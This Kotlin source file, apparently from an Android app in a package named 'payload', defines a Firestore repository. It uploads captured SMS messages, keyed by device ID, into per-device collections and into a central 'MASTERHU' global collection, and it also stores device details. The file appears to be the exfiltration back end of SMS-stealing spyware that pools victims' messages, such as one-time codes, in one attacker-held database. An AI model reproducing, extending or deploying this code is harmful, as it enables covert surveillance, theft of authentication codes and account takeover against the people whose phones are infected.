package com.payload.jansiix0ne.data.repository

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.model.SmsModel
import kotlinx.coroutines.tasks.await

/**
 * Repository for Firestore operations
 */
class FirestoreRepository {
    private val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
    companion object {
        private const val TAG = "FirestoreRepository"
        private const val COLLECTION_MASTER = "MASTERHU"
        private const val COLLECTION_GLOBAL_SMS = "global_sms"
        private const val COLLECTION_INCOMING_SMS = "incoming_sms"
    }

    /**
     * Store SMS in device-specific collection and global collection
     */
    suspend fun storeSms(sms: SmsModel, deviceId: String): Result<Unit> {
        return try {
            // Store in device-specific collection
            val deviceCollection = firestore
                .collection(COLLECTION_INCOMING_SMS)
                .document(deviceId)
                .collection(COLLECTION_INCOMING_SMS)
            
            deviceCollection.add(sms).await()
            
            // Store in global collection
            val globalCollection = firestore
                .collection(COLLECTION_MASTER)
                .document(COLLECTION_GLOBAL_SMS)
                .collection(COLLECTION_GLOBAL_SMS)
            
            globalCollection.add(sms).await()
            
            Log.d(TAG, "SMS stored for device: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to store SMS: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save or update device information
     */
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .set(deviceModel, SetOptions.merge())
                .await()
            
            Log.d(TAG, "Device info saved: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save device info: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Get device information
     */
    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .get()
                .await()
            
            if (document.exists()) {
                val deviceModel = document.toObject(DeviceModel::class.java)
                Result.success(deviceModel)
            } else {
                Result.success(null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get device info: ${e.message}", e)
            Result.failure(e)
        }
    }
}
